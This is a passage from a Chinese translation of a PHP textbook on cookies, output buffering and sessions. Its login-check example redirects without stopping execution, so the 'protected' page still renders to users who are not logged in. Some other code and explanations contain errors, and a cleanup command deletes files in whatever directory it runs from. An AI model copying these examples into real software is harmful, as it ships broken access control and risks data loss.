最后，一个重要提示：由于 Cookie 是作为 HTTP 标头的一部分发送的，因此所有对 setcookie() 的调用都必须在第一个 HTML 输出之前进行。3 这是因为一旦传递 HTML，HTTP 标头就已经发送了。如果之后仍设置 HTTP 标头，则在某些 PHP 版本和配置中会出现图 14.4 所示的错误消息。

![](img/ae7820c36e8f24c1623d26668b28e80e_465_0.png)

图 14.4 Cookie 必须在脚本开头设置

在以下脚本中，操作是正确的；也就是说，在输出 HTML 代码之前设置了几个 Cookie。

```php
<?php
setcookie("ProgrammingLanguage", "PHP",
    time() + 60*60*12, "/");
setcookie("LanguageVersion", "8",
    mktime(0, 0, 0, 12, 24, 2025), "/");
setcookie("Session", "abc123", 0, "/");
?>
<html>
<head>
<title>Cookies</title>
</head>
<body>
<p>Cookies have been set!</p>
</body>
</html>
```

## 清单 14.1 设置三个 Cookie ("set.php")

此脚本的输出相对寥寥无几，因为—如已提及—Cookie 仅在下次访问页面时才会发送到服务器。但是，如果查看浏览器开发者工具，至少会看到 Cookie HTTP 标头。图 14.5 显示了 Chrome 浏览器中的情况。

![](img/ae7820c36e8f24c1623d26668b28e80e_466_0.png)

图 14.5 浏览器开发者工具揭示了 Cookie 的到达。

> > **提示**
> > 如果仍想（甚至不得不）在 PHP 页面中间设置 Cookie 以方便操作，可以使用*输出缓冲*函数。有关此内容的更多信息，请参阅本章末尾。

> > **注释**
> > 如果要更改 Cookie 的值，必须输入与创建 Cookie 时完全相同的信息（过期日期和 Cookie 值本身除外，因为您可能希望更改这些信息）。如果不这样做，PHP 或 Web 浏览器会创建多个同名 Cookie。

关于时间顺序，最后简要说明：Cookie 按其在 PHP 脚本中出现的顺序发送到客户端。

## 特殊字符

Cookie 值会自动进行 URL 编码，因此在幕后会调用 `urlencode()`。但是，可能存在不希望这样做的情况，例如 Cookie 值已经过 URL 编码。在这种情况下，请使用 `setrawcookie()` 函数，它不会修改 Cookie 的值。除此之外，该函数与 setcookie() 相同。

### 14.3.2 读取 Cookie

PHP 读取客户端发送到 Web 服务器的所有 Cookie，并将其放入 $_COOKIE 全局数组中以供使用。以下简单脚本输出此数组的内容；它只需调用 print_r()。

```html
<html>
<head>
<title>Cookies</title>
</head>
<body>
<xmp>
<?php
print_r($_COOKIE);
?>
</xmp>
</body>
</html>
```

## 清单 14.2 输出 "$_COOKIE" 的内容 ("print_r.php")

图 14.6 显示了此脚本的输出（如果先前已执行 set.php，请参见清单 14.1）。

![](img/ae7820c36e8f24c1623d26668b28e80e_467_0.png)

图 14.6 "$_COOKIE" 的内容出现在浏览器中

要访问单个 Cookie，必须使用 Cookie 名称作为数组键。以下清单显示了先前设置的三个 Cookie。结果如图 14.7 所示。





```html
<html>
<head>
<title>Cookies</title>
</head>
<body>
<table>
<tr><th>Name</th><th>Value</th></tr>
<tr><td>Programming language</td><td>
<?php
echo htmlspecialchars(
$_COOKIE["Programming language"]);
?>
</td></tr>
<tr><td>Language version</td><td>
<?php
echo htmlspecialchars(
$_COOKIE["Language version"]);
?>
</td></tr>
<tr><td>Session</td><td>
<?php
echo htmlspecialchars(
$_COOKIE["Session"]);
?>
</td></tr>
</table>
</body>
</html>
```

清单 14.3 输出三个 Cookie（"read.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_468_0.png)

图 14.7 Cookie 值在浏览器中显示

但请注意：如果不存在指定名称的 Cookie，将根据相应的 PHP 配置显示一条警告消息。要测试此问题，请关闭所有浏览器窗口，重新启动浏览器，然后再次调用 read.php 脚本（或者，如果您的 Web 浏览器允许，也可以手动删除 session Cookie）。您可以在图 14.8 中看到结果：Cookie session 不再存在（因为它没有过期日期）。因此，`$_COOKIE["Session"]` 无法指向任何位置。

![](img/ae7820c36e8f24c1623d26668b28e80e_469_0.png)

图 14.8 不存在的 Cookie 的错误消息

因此，您必须显式检查 Cookie 是否存在。可以使用 array_key_exists() 数组函数（参见第 8 章）：

```
if (array_key_exists("Session", $_COOKIE)) {
    // ...
}
```

不过，更常见的是使用 empty() 或 isset() 进行检查，如表单处理中所示：

```
if (isset($_COOKIE["Session"])) {
    // ...
}
```

> **注**
>
> 清单 14.3 的相应改进版本可在本书的在线资料（参见前言）中找到，文件名为 read-improved.php。警告消息在那里也会消失。

这样您可以读取每个 Cookie，但不能读取其属性（如路径和过期日期）。此类数据仅存储在客户端；只有 Cookie 名称和 Cookie 值会发送到服务器。

### 14.3.3 删除 Cookies

最后，还有一个如何删除 Cookie 的问题。例如，如果 Cookie 存储了用户已登录受保护系统的事实，那么删除它可能很有用。

这里的诀窍是将过期日期设置为过去的日期。浏览器随后将从 Cookie 内存中删除该 Cookie。

例如，值 0 很适合此目的——即将日期转换为 1970 年 1 月 1 日——因为它显然在过去。以下代码将对会话 Cookie 执行此操作；对于永久 Cookie，其工作方式相同：

```
setcookie("Session", "abc123", 0, "/" );
```

> **注**
>
> 再次注意，请务必使用与设置 Cookie 时相同的其余参数。如果省略用于路径的第四个参数，浏览器将把该 Cookie 视为一个新的碎屑 Cookie（随后会因过期日期而立即将其删除）。

让我们创建一个小应用程序，使用户能够删除 Cookie。为此，所有 Cookie 都将在 foreach 循环中输出：

```
foreach ($_COOKIE as $name) {
// ...
}
```

输出每个 Cookie 后，会输出一个链接，该链接带有 URL 参数 ?kill-cookiename 再次调用脚本。如果识别到此参数，脚本将再次删除该 Cookie——当然，是在第一个 HTML 输出之前：

```
if (isset($_GET["kill"])) {
setcookie($_GET["kill"], "", 0, "/" );
}
```

为了让 Web 服务器看到这些更改，必须重新加载页面；否则，$_COOKIE 数组起初仍将包含已删除的 Cookie：

```
echo("<meta http-equiv=\"refresh\" " .
"content=\"0;url=\" " .
htmlspecialchars($_SERVER["PHP_SELF"]) .
"\">");
```

> **提示**
>
> 您可能会问：为什么这么复杂？为什么不直接使用 HTTP 重定向？您需要输出 HTTP 标头 Location。在 PHP 中，这是通过 header() 函数完成的。通过 $_SERVER["PHP_SELF"]，您可以访问当前脚本的 URL，从而确保重定向或重新加载（nl2br() 会删除任何现有的换行符）：
> header("Location: " . nl2br($_SERVER["PHP_SELF"]));

之所以这样做，是因为 Microsoft IIS Web 服务器的旧版本存在一个 bug。如果调用一个设置（或删除，从技术上讲是同一件事）Cookie 的 CGI 脚本，然后立即执行服务器端重定向，则该 Cookie 不会从 Web 服务器发送到 Web 浏览器。
出于此原因，您需要使用显示的 <meta> 标签进行 HTML 重定向。

完整的脚本在下一个清单中显示；图 14.9 展示了其应用。

```
<?php
if (isset($_GET["kill"])) {
setcookie($_GET["kill"], "", 0, "/");
}
?>

<html>
<head>
<title>Cookies</title>

<?php
if (isset($_GET["kill"])) {
echo("<meta http-equiv=\"refresh\" " .
"content=\"0;url=\" " .
htmlspecialchars($_SERVER["PHP_SELF"]) .
"\">");
}
?>

</head>
<body>
<table>
<tr><th>Name</th><th>Value</th>
<th>Delete?</th></tr>

<?php
foreach (array_keys($_COOKIE) as $name) {
echo("<tr><td>" . htmlspecialchars($name) .
"</td>");
echo("<td>" .
htmlspecialchars($_COOKIE[$name]) .
"</td>");
echo("<td><a href=\"" .
htmlspecialchars($_SERVER["PHP_SELF"]) .
"?kill=" . urlencode($name) .
"\">Yes</a></td></tr>");
}
?>

</table>
</body>
</html>
```

清单 14.4 可以删除 Cookies（"delete.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_472_0.png)

图 14.9 基于 Web 的 "Cookie 擦除器" 实际运行

该应用程序有一些微妙之处。例如，在使用 htmlspecialchars() 输出之前，会将 Cookie 名称和值转换为 HTML 格式。这样可以避免显示中出现潜在的"灾难"（例如，如果 Cookie 值包含尖括号）。此外，在输出链接或重新加载页面之前，脚本名称始终通过 $_SERVER["PHP_SELF"] 读取。这意味着即使重命名脚本，它仍然可以工作。

但是，有一个限制：如前所述，路径值必须与删除 Cookie 时实际设置的 Cookie 路径匹配。这无法通过 PHP 读取。出于此原因，值 "/" 被"猜测"为路径。如果 Cookie 具有不同的路径，删除将不起作用。

### 14.3.4 "新" Cookies

如前所述，www.ietf.org/rfc/rfc2965.txt 上提供了一种新的 Cookie 规范。该规范在设置 Cookie 时使用 Set-Cookie2 而非 Set-Cookie 作为 HTTP 标头。Cookie 数据的传输方式也不同；例如，Cookie 值带引号传输：

```
Set-Cookie2: Session="abc123"; Path="/"
```

这会设置一个名为 Session、值为 "abc123" 的 Cookie，可在整个网站（路径 /）上读取。客户端随后按以下方式将 Cookie 发送回 Web 服务器：

```
Cookie: $Session="abc123"; $Path="/"
```

当前浏览器尚不支持此规范。但是，已经可以在 PHP 中使用此技术。您必须使用 header() 函数设置 Cookie，该函数允许您指定 HTTP 标头：

```
header("Set-Cookie2: Session=\"abc123\"; Path=\"/\"");
```

一旦出现可以处理这些"新" Cookie 的客户端，您将通过 $_SERVER["HTTP_COOKIE"] 访问这些数据。

> **提示**
>
> $_SERVER["HTTP_COOKIE"] 已经包含 Cookie 名称和值的列表；$_COOKIE 的数据也是从此确定的。

由此可见，使用 PHP 您已经为下一代 Cookie 做好了准备；但是，由于浏览器需要向后兼容，这可能需要一段时间才能普及。但这似乎是值得的，因为新规范包括将 Cookie 绑定到端口的选项。

## 输出缓冲

我们之前已经提示过：由于 Cookie 作为 HTTP 标头的一部分发送，因此必须在第一个 HTML 输出之前设置它们，因为 PHP 会将您输出的所有数据（例如，使用 echo 或 print，甚至是 HTML 片段）直接发送到客户端。但是，您可以通过使用输出缓冲来防止这种情况。

按照以下步骤操作：

1. 使用 ob_start() 启用输出缓冲。
2. 输入您希望输出的数据（包括 Cookie）。
3. 使用 ob_end_flush() 将所有缓冲的数据发送到 Web 浏览器（如果省略该函数，缓冲区将在页面结束时自动发送到客户端）。

因此，我们可以如下在清单 14.5 中修订清单 14.1——在页面中间调用 setcookie()。

```
<?php
ob_start();
?>
<html>
<head>
<title>Cookies</title>
</head>
<body>
```



<?php
setcookie("ProgrammingLanguage", "PHP",
        time() + 60*60*12, "/");
setcookie("LanguageVersion", "8",
        mktime(0, 0, 0, 12, 24, 2025), "/");
setcookie("Session", "abc123", 0, "/");
?>
<?php echo "Cookies have been set!"; ?>
</body>
</html>
<?php
ob_end_flush();
?>

## 列表 14.5 使用缓冲区设置三个 Cookie（"set-buffering.php"）

输出缓冲区提供了许多其他选项，此处仅简要介绍其中一种：大多数 Web 浏览器都支持使用 Gzip 压缩的数据。这样可以节省大量带宽，因为 Web 服务器发送的不是 HTML 文档，而是其压缩版本。

以下调用（必须位于页面头部）可为页面启用 Gzip 压缩：

```
ob_start("ob_gzhandler");
```

由于只能对完整页面使用 Gzip（或其他算法）进行压缩，因此此处需要输出缓冲区。顺便提一下，PHP 机制会自动检查浏览器是否支持 Gzip。如果不支持，数据将以常规方式（即未压缩）发送。不过应当注意，如果需要，某些 Web 服务器也可以自动使用 Gzip 压缩所有传出数据。

## 14.4 Cookie 测试

让我们通过一个应用示例来演示所学内容。由于用户可以禁用 Cookie，因此判断用户是否接受 Cookie 非常重要。此类测试可以相对快速地创建。

首先，必须向 Web 浏览器发送 Cookie。由于大多数浏览器现在分别处理临时 Cookie 和持久 Cookie，因此应测试两种类型的 Cookie：

```
setcookie("CookieTemp", "ok");
setcookie("CookiePerm", "ok", time() + 60*60*24);
```

这些 Cookie 只有在 Web 服务器请求下一份文档时才会在 $_COOKIE 中可用。由于 IIS 的 bug，使用 header() 进行转发被排除在外（当然，除非你知道你的应用程序绝不需要安装在 IIS Web 服务器上）。相反，会再次使用一个 <meta> HTML 标签：

```
echo "<meta http-equiv=\"refresh\" " .
"content=\"0;url=" .
htmlspecialchars($_SERVER["PHP_SELF"]) .
"?test=ok\">";
```

会再次调用相同的脚本，但这次 URL 中会附加 ?test=ok。脚本会识别该参数，然后检查 Cookie 是否存在：

```
if (isset($_GET["test"])) {
$temp = array_key_exists("CookieTemp",
$_COOKIE);
$perm = array_key_exists("CookiePerm",
$_COOKIE);
}
```

下面的列表显示了完整的脚本。

```
<?php
if (isset($_GET["test"])) {
$temp = array_key_exists("CookieTemp",
$_COOKIE);
$perm = array_key_exists("CookiePerm",
$_COOKIE);
setcookie("CookieTemp", "", 0);
setcookie("CookiePerm", "", 0);
} else {
setcookie("CookieTemp", "ok");
setcookie("CookiePerm", "ok", time() + 60*60*24);
}
?>
```

```
<html>
<head>
<title>Cookies</title>
```

```
<?php
if (!isset($_GET["test"])) {
echo "<meta http-equiv=\"refresh\" " .
"content=\"0;url=" .
htmlspecialchars($_SERVER["PHP_SELF"]) .
"?test=ok\">";
}
?>
```

</head>
<body>

<?php
if (isset($_GET["test"])) {
    echo "Temporary cookies are " .
    ($temp ? "" : "not " .
    "supported.<br />");
    echo "Permanent cookies are " .
    ($perm ? "" : "not " .
    "supported.");
} else {
    echo "Cookies are being set ...";
}
?>

</body>
</html>

## 列表 14.6 检查 Cookie 支持（"cookietest.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_476_0.png)

## 图 14.10 浏览器仅支持临时 Cookie

> **注意**
> 代码使用 ? 运算符输出已确定的浏览器配置：
> echo("Permanent cookies are " .
> ($perm ? "" : "not " .
> "supported."));
> 如果 $perm 的值为 false，则插入 "not "；否则，只插入一个空格。
> 此外，测试后会再次删除已设置的 Cookie，以免留下不必要的残留。

## 14.5 最后考虑

Cookie 当然很有用，但许多用户拒绝这项技术。因此，你必须遵循两条指导原则：

- 确保即使没有 Cookie，你的网站也能完美无限制地运行。
- 不要欺负那些启用了 Cookie 的用户。

关于最后一点：可能的“限制”例如包括设置许多单独的 Cookie，比如每张图片都发送一个——或者当这些信息也可以存储在单个 Cookie 中时，却设置多个单独的 Cookie。这样做的原因之一是（理论上）300 个 Cookie 的限制。

另一个烦人之处是 Cookie 的过期日期。普通 PC 的使用寿命可能为两到五年——因此让 Cookie 一直有效到 2037 年实在有点尴尬。通常一年就足够了。由于 300 个 Cookie 的限制，大多数 Cookie 根本等不到它们的第一个生日。

关于 Cookie 危险的谣言真相如何？如果 Cookie 只发送给设置过该 Cookie 的域，那么透明的冲浪者是不可能的。

这基本上是正确的，但有几种方法可以绕过这一限制。假设你访问包含来自 www.ad-company.zzz 的广告横幅的网站 www.xy.zzz。这意味着广告商可以设置一个可发回至 ad-company.zzz 的 Cookie。到目前为止，一切都好。

不过现在，你访问了另一个碰巧为横幅显示使用相同广告商的网站。因此，如果在这个网站上显示图形并由 ad-company.zzz 请求，广告商就会收到 Cookie 并识别出你——尽管你在一个完全不同的网站上。

这个场景中的“损害”当然是有限的。广告商可以确定你访问哪些网站，根据此创建用户档案，并向你提供有针对性的广告。但是，电子邮件地址或你在网站上输入的其他个人信息对广告商来说是不可见的。实践也表明，面向特定群体的广告横幅似乎并不真的有效，这点两位作者的自行测试已经证明。相反，我们经常看到已经购买过的产品的广告。此外，这些第三方 Cookie 会在当前浏览器版本按需被过滤掉。

一种较老的方法是在数据收集服务器上手动设置 Cookie 中的域值。无论你在哪个页面上，Cookie 看起来都来自收集站点，并且也会发回给该站点。但是，此方法已不再有效；浏览器可以自动拒绝第三方 Cookie。因此，即使这个“技巧”曾经偶尔被使用过，如今也已成为过去式。

# 第 15 章

# 会话

*会话依赖于 Cookie，但使用更方便。虽然也可以在不使用 Cookie 的情况下使用会话，但不推荐这样做。*

HTTP 是一种无状态协议；上一章已经多次指出这一点。Cookie 只是绕过此限制的一种方式。从最终用户的角度来看，Cookie 的主要问题是，在一定范围内可以用来创建用户档案。从网站开发者的角度来看，Cookie 的主要问题是它们可以在浏览器中被禁用。或者更确切地说，它们*可能*被禁用——但这一点稍后再讨论。

一种可能的解决方案可以用一个词来表达：会话。¹ 当冲浪者访问网站时，就会发生一次会话。因此，如果你打开网上商店的首页，点击几个页面，10 分钟后又冲浪到另一个网站，那么你与该商店进行了一次 10 分钟的会话。如果一小时后你返回商店，这通常会被视为新会话。

PHP 提供了在会话中存储数据的选项。这意味着你可以保存会话数据——使用稍后解释的机制——并且只要会话处于活动状态，就可以再次访问这些数据。PHP 会自动处理所有技术细节（数据存储在哪里，如何实现访问等）。

## 15.1 准备工作

PHP 的会话支持也是 PHP 的一部分，不需要任何额外的 DLL 或配置开关。² 不过，在本章中，你有时会想要修改 *php.ini* PHP 配置文件。那里有一个 [Session] 部分，汇总了所有相关设置。首先，重要的是设置 *session.save_path* 的值。PHP 随附的 *php.ini* 模板包含以下内容：

```
session.save_path = "/tmp"
```

为什么这只是注释？在 Unix/Linux 系统中，目录 */tmp* 通常存在，并且对 Web 服务器或 PHP 进程也是可写的，但在 Windows 上，此

¹ 不过，如你稍后将看到，会话和 Cookie 可以完美互补。

² 但是，作为交换，你可以使用 --disable-session 配置选项完全禁用会话支持。





目录通常不存在。即使存在，Web 服务器也可能没有写入权限。因此，在这种情况下会话管理会失败。有三种方法可以解决此问题：

- 创建目录，并向 Web 服务器分配写入权限。
- 为 `session.save_path` 指定一个不同的目录，该目录当然必须存在，并且 Web 服务器对其具有写入权限。例如，对于 Apache，Apache 临时目录非常合适，因为那里只存放与 Web 服务器相关的内容。（系统临时目录包含计算机上所有应用程序的临时数据，这使得调试更加困难）。
- 什么都不做。数据将存放在系统默认的临时目录中。例如，在 Windows 10 和 IIS 的组合中，使用 C:\Windows\Temp 文件夹。

这些准备性话语已经暗示了 PHP 如何管理会话数据：它们只是被写入文件系统。还有其他选项，但稍后再讲。

> 提示
>
> 不能简单地将所有会话数据都丢到一个目录中；在某些文件系统上，当文件数量超过一定数量时，这样做就不再具有性能。有一个配置选项可以自动为会话数据创建子目录：
>
> session.save_path = "n;/tmp";
>
> 其中 n 是目录深度（目录名由一个数字或 a 到 f 之间的字符组成）。例如，如果 n 的值为 3，会话数据将在 /tmp/1/a/7 等目录中创建。这些目录必须已存在；PHP 源代码包含一个 shell 脚本 (ext/session/mod_files.sh)。

## 15.2 事实、背景和配置

首先说说实际过程：如前所述，使用 PHP 会话管理时，可以将数据保存在会话中。这些数据被序列化³并存储在数据内存中——通常出于简单性原因存储在 Web 服务器的文件系统中。每个会话都有一个编号，默认是一个 32 位的十六进制值。（注意：在标准交付的 php.ini 中，此值被覆盖为 26；该设置称为 session.sid_length。）这个编号，即所谓的会话 ID，充当当前会话数据的唯一标识符。因此，单个会话之间缓冲数据的问题简化为在客户端-服务器模型中传输会话 ID。其余的数据存储完全在 Web 服务器上进行，并由 PHP 处理。

3 序列化将复杂数据（对象、数组）转换为“扁平”结构，例如字符串。在 PHP 中，这主要通过 `serialize()` 函数完成。逆向转换由 `unserialize()` 函数执行。

### 15.2.1 保留数据

对开发人员来说，工作量仅限于正确配置 PHP 和 Web 服务器，并确保会话 ID 始终在客户端和服务器之间来回传输。有两种方法：

- 会话 ID 存储在 Cookie 中。
- 会话 ID 附加到所有 URL。

乍看之下，第一种选项，即使用 Cookie，似乎很荒谬：正是 Cookie 的缺点——即用户（或管理员）可以禁用它们——会话旨在纠正。不过，再仔细看一下，Cookie 是会话管理唯一合理的选项。正如以下解释将显示的那样，没有 Cookie 的会话管理有明显的缺点。

对于第二种选项，出于完整性起，我们想明确描述这一点，即使我们绝不推荐这种方法。在第 15.6 节中，我们将更详细地解释会话中存在哪些顾虑和安全特性。

首先，让我们看看技术实现。将会话 ID 附加到所有 URL 会导致按照以下模式生成的地址：

```
http://server/script.php?PHPSESSID=d5dbc3af2d4bbcc445990165c5758005
```

如果您现在使用 PHP 调整每个页面上的每个单独链接，使会话 ID 自动附加，您就实现了目标：会话 ID 永远不会丢失，因此您保留相关的会话数据。会话 ID 本身可作为 GET 参数使用，因此不应影响脚本的输出。

听起来很复杂？确实如此。但如果没有实际的解决办法，PHP 就不像 PHP 了。可以自动调整所有链接。这需要两个步骤：

- 将 `session.use_trans_sid` 选项在 php.ini 中设置为值 1。
  如果使用 Unix/Linux，请使用以下开关配置 PHP：
  `./configure --enable-trans-sid`
- 在 Windows 下不需要此步骤；PHP 发行版已以这种方式编译。

一旦执行了这两个步骤，会话 ID 就可以自动附加到所有链接。这里的重点是“可以”：决定取决于 `session.use_cookies` 和 `session.use_only_cookies` php.ini 配置设置。

如果激活 `session.use_only_cookies`——即设置为 1——那么 PHP 的会话管理仅适用于 Cookie。因此，客户端必须支持 Cookie。`session.use_cookies` 的情况不同。如果将此项设置为 0——即关闭——则根本不使用 Cookie；会话 ID 会自动添加到 URL。但是，建议激活此选项，因为 PHP 会尝试设置带有会话 ID 的 Cookie。如果客户端接受此 Cookie，则使用 Cookie。但是，如果客户端拒绝 Cookie，则 PHP 会自动切换到“通过 URL 传递会话 ID”模式。表 15.1 说明了此过程。

| "session.use_cookies" | "session.use_only_cookies" | 浏览器是否支持 Cookie | PHP 会话是否使用 Cookie 实现 |
|---|---|---|---|
| 0 | 0 | 是 | 不使用 |
| 0 | 0 | 否 | 不使用 |
| 0 | 1 | 是 | 使用 |
| 0 | 1 | 否 | 不可能！ |
| 1 | 0 | 是 | 使用 |
| 1 | 0 | 否 | 不使用 |
| 1 | 1 | 是 | 使用 |
| 1 | 1 | 否 | 不可能！ |

### 表 15.1 会话设置对 Cookie 的影响

但是，PHP 如何自动在生成的 HTML 代码中查找链接呢？很简单，PHP 解释器会搜索特定模式。这些模式在 *php.ini* 中定义：

```
session.trans_sid_tags = "a=href,area=href,frame=src,form="
```

此值的结构为 Tag=Attribute，即使未设置属性，等号也是必需的。`<form>` 的条目占据特殊位置：这确保了带有会话名称和 ID 的隐藏表单字段被集成。

> **注意**
>
> 此时一个小小的遗漏立刻就能注意到：对于 `<iframe>` 元素，不会自动附加会话 ID。因此，您应该将此值添加到您的 *php.ini* 中：
>
> `session.trans_sid_tags = "a=href,area=href,frame=src,iframe=src,form="`

### 15.2.2 性能

很明显，PHP 的会话支持会消耗大量性能。生成 HTML 代码后，仍需搜索其中的 URL，并且可能需要将这些 URL 扩展为包含会话 ID。这需要时间，因为必须查找 _和_ 重写所有链接。因此，您应仅在需要的地方使用会话支持。电子商务网站是个例外，它们需要在每个页面上处处使用会话数据，因为购物车的内容不能丢失。如果需要，可以配置 PHP 使会话始终处于活动状态。这是通过在 _php.ini_ 中使用以下设置实现的：

```
session.auto_start = 1
```

默认情况下，出于前文提到的原因，`session.auto_start` 的值为 0。

**注意**

在以下示例中，我们始终假设会话 _不会_ 自动激活。因此，我们使用 `session_start()` PHP 函数在每个页面上启动会话。如果将 `session.auto_start` 设置为 1，则必须从示例代码中删除对 `session_start()` 的调用。

存在潜在的性能问题：会话数据目录可能会溢出。作为对策，PHP 解释器会在需要时自动清理。此过程称为 _垃圾回收_。首先，您指定执行此过程（本身也会消耗性能）的概率。此概率以分数形式指定。分子在 `session.gc_probability` 中，分母在 `session.gc_divisor` 中。您可以在这里看到 _php.ini_ 中的默认设置：

```
session.gc_probability = 1
session.gc_divisor = 1000
```

在这种情况下，平均每千次会话管理调用会执行一次清理过程，并删除不再需要的旧会话数据。但是，什么时候会话被视为旧或不必要？这是由第三个配置开关指示的：

```
session.gc_maxlifetime = 1440
```

`session.gc_maxlifetime` 指定会话数据的最大生存时间（以秒为单位）。顺便说一句，1,440 秒对应 24 分钟——诚然，这是一个有点奇怪的值。因此，如果在 24 分钟内会话中不再点击任何链接，则会话被视为已结束，相关数据将在下一次清理过程中删除。




注意
不幸的是，这并不总是有效。因此，你应该使用 cron 作业或 Windows 计划任务，确保会话目录中修改日期较旧的文件被定期删除。以下是 Unix/Linux 的示例。使用下面的命令，当前目录中（即，当前目录应为会话目录）超过 24 分钟未更改的所有文件将被删除：
find -cmin +24 | xargs rm

## 15.3 在 PHP 中使用会话

与使用 Cookie 编程相比，使用会话非常简单。虽然有一些用于会话管理的函数，但大多数情况下编程工作仅限于读写 $_SESSION 超全局数组。

### 15.3.1 写入数据

将数据存储在会话中需要两个步骤：

- 使用 session_start() 启动会话管理，如果尚未启动（例如，通过在 php.ini 中设置 session.auto_start = 1）。
- 将数据写入 $_SESSION。

注意
由于可能会使用 Cookie，你必须在向客户端发送 HTML 之前启动会话管理，因此请在页面的标题中调用 session_start()。然而，数据可以在页面上的任何位置写入，因为仅向客户端发送会话 ID。在调用 session_start() 时，该 ID 已经定义。

下面的清单提供了一个小示例。

```php
<?php
session_start();
?>
<html>
<head>
<title>Sessions</title>
</head>
<body>
<?php
$_SESSION["Programming language"] = "PHP";
$_SESSION["Language version"] = 8;
?>
<p>Session variables have been set!</p>
<p><a href="read.php">Continue ...</a></p>
</body>
</html>
```

### 清单 15.1 数据已写入会话（"write.php"）

在 Web 浏览器中的输出并不惊人。但是，如果你在浏览器开发者工具中查看 HTTP 请求（参见图 15.1），你会发现 PHP 实际上试图发送一个 Cookie——前提是你已将 session.use_cookies 设置为 1。

![](img/ae7820c36e8f24c1623d26668b28e80e_485_0.png)

### 图 15.1 PHP 发送会话 Cookie

此时，你肯定会注意到一个小问题：用户是否接受 Cookie 只能在下一次向 Web 服务器请求时确定。换句话说，如果 Cookie 被拒绝，PHP 将在下一次请求之前不会检测到这一点。为保险起见，PHP 会自动将会话 ID 添加到链接中（如前所述，仅当你启用了此功能时才会这样做，这不是个好主意，我们将在后面解释）。PHP 脚本生成的 HTML 代码如下，只是你的系统上的会话 ID 会不同：

```html
<html>
<head>
<title>Sessions</title>
</head>
<body>
<p>Session variables have been set.</p>
<p><a href="read.php?PHPSESSID=608ee8f487078be111287100b8b4851b">Continue ...</a></p>
</body>
</html>
```

如果你查看会话目录，你会在那里找到一个会话文件（参见图 15.2）；文件名由 sess_ 和相应的会话 ID 组成。此文件以序列化形式包含指定的值：

```
Programming language|s:3: "PHP";Language version|i:8;
```

![](img/ae7820c36e8f24c1623d26668b28e80e_486_0.png)

### 图 15.2 包含一个文件的会话目录：生产系统上有更多文件

### 15.3.2 读取数据

读取数据同样简单：你只需在 $_SESSION 中查看所需数据是否存在。但请注意，此数组仅在调用 session_start() 后才会填充相应的值。清单 15.2 显示了读取清单 15.1 中写入的会话数据的相应脚本。

```php
<?php
session_start();
?>
<html>
<head>
<title>Sessions</title>
</head>
<body>
<p>Programming language:

<?php
if (isset($_SESSION["Programming language"])) {
 echo htmlspecialchars($_SESSION["Programming language"]);
 }
?>
</p>
<p>Language version:

<?php
if (isset($_SESSION["Language version"])) {
 echo htmlspecialchars($_SESSION["Language version"]);
 }
?>
</p>
<p><a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">Reload</a></p>
</body>
</html>
```

### 清单 15.2 会话数据已读出（"read.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_487_0.png)

### 图 15.3 Web 浏览器中的会话数据

如果仔细查看生成的 HTML 代码，你会注意到，现在，在第二次调用带有会话支持的页面后，如果你在浏览器中启用了 Cookie 支持（参见图 15.3），URL 不再由会话 ID 扩展。否则，会话 ID 将继续附加到所有链接，即使使用表单或框架也不会丢失。

### 15.3.3 删除数据

要从会话中删除数据，有两种方法：

- 将相应的会话变量设置为空字符串或零。这并未从根本上删除变量，但会删除其值。
- 使用 PHP 函数 unset() 删除相应的会话变量。

对于进一步编程，两种方法的结果相同，但出于性能原因，使用 unset() 更可取：

```php
<?php
if (isset($_SESSION["Programming language"])) {
    unset($_SESSION["Programming language"]);
}
?>
```

也可以删除整个会话（例如，在注销时）。这需要两个步骤：

- 首先，session_unset() 从会话中删除所有变量；这等同于在 foreach 循环中使用 unset() 从 $_SESSION 中删除所有变量。或者，你也可以使用以下技巧删除会话数组：
  - $_SESSION = [];
- 然后 session_destroy() 删除会话本身。

你可能还对删除会话 Cookie 感兴趣，如果它已被设置的话。其名称在 php.ini 中设置。默认情况下，那里有以下条目：

```
session.name = PHPSESSID
```

你可以使用 PHP 的 session_name() 动态从 PHP 中读取此值。以下调用会删除此（临时）Cookie：

```php
<?php
setcookie(session_name(), "away with it", 0, "/");
?>
```

下一个清单一次性完成所有这些任务。

```php
<?php
session_start();
?>
<html>
<head>
<title>Sessions</title>
</head>
<body>
<?php
session_unset();
session_destroy();
setcookie(session_name(), "away with it", 0, "/");
?>
<p>Everything deleted!</p>
</body>
</html>
```

### 清单 15.3 所有会话数据均已删除（"delete.php"）

### 15.3.4 配置会话

原则上，会话配置使用 php.ini 文件。但是，可以在调用 session_start() 时指定配置选项，这些选项将优先于相应的 php.ini 设置。这本身可能并不十分有趣。但是，有一个仅在 session_start() 中起作用的配置设置：read_and_close。如果启用此设置，会话会在读取数据后立即关闭。对于不向会话写入任何数据而仅读取数据的页面来说，这是一种简单但有效的性能措施。相应的调用如下所示：

```php
session_start(["read_and_close" => true]);
```

因此，session_start() 的参数是一个数组，因此你也可以一次性指定多个值。

## 15.4 受保护区域

会话在基于 PHP 的网站上很常见。特别是在线商店，无论是来自书商还是旅行社，没有会话都无法运行。所有这些应用程序的基础相同：数据在会话中进行管理。

Web 上的一个经典应用是网站的某些区域（例如客户区）只有在用户之前已进行身份验证时才可用。此处使用会话变量来存储用户是否有权访问。如果是，则显示页面内容；如果否，则将用户重定向到登录页面。

该应用程序包含两部分：首先，一个包含文件，其中检查会话变量是否存在。如果该变量不存在，则重定向到登录页面。其特殊之处在于当前 URL 被附加，以便在登录后可直接重定向到原始页面。下面的清单显示了此代码。

```php
<?php
session_start();

if (!isset($_SESSION["login"]) || $_SESSION["login"] != "ok") {
    $url = $_SERVER["SCRIPT_NAME"];
    if (isset($_SERVER["QUERY_STRING"])) {
        $url .= "?" . $_SERVER["QUERY_STRING"];
    }
    header("Location: login.php?url=" . urlencode($url));
}
?>
```

### 清单 15.4 登录检查的代码（"login.inc.php"）

此脚本像往常一样使用 require_once 安装。

```php
<?php
require_once "login.inc.php";
?>
```

```html
<html>
<head>
<title>Protected Area</title>
</head>
<body>
<h1>Secret Info ...</h1>
</body>
</html>
```

### 清单 15.5 受保护页面（"protected.php"）

现在只缺登录表单了（参见图 15.4）。在那里检查用户名和密码的组合。在示例中，正确组合直接输入脚本中；此数据通常从数据库中检索以允许多个用户访问。

